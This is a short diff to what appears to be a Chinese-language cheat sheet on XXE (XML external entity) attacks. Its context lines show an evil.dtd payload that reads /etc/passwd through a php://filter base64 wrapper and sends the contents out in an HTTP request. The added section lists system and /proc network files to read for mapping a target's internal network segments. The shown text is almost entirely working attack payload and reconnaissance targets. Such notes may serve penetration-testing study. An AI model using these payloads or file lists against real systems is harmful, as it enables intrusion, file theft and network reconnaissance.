@@ -90,3 +90,15 @@ evil.dtd
 <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
 <!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://127.0.0.1/?p=%file;'>">
 ```
+
+## 获取内网网段
+
+```
+/etc/network/interfaces
+/etc/hosts
+/proc/net/arp
+/proc/net/tcp
+/proc/net/udp
+/proc/net/dev
+/proc/net/fib_trie
+```
